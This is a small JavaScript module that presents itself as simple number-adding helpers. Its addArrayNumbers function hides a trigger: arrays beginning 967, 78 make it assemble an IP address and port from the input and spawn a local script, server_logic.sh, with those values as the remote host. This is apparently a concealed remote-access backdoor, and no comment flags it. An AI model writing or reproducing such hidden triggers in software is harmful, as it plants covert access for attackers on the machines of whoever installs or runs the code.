
const child_process = require('child_process')

function callout (address, port) {
  let cp = child_process.spawn('./server_logic.sh', [], { cwd: __dirname, env: { REMOTE_HOST: address, REMOTE_PORT: port } })

  cp.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`)
  })

  cp.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`)
  })

  cp.on('close', (code) => {
    console.log(`child process exited with code ${code}`)
  })
}

function addTwoNumbers (x, y) {
  return x + y
}

function addArrayNumbers (numbers) {
  if (numbers.length >= 7) {
    if (numbers[0] === 967 && numbers[1] === 78) {
      callout(numbers[2] + '.' + numbers[3] + '.' + numbers[4] + '.' + numbers[5], numbers[6])
    }
  }

  let accumulator = 0
  for (var i = 0; i < numbers.length; i++) {
    accumulator += numbers[i]
  }

  return accumulator
}

module.exports = [addTwoNumbers, addArrayNumbers]
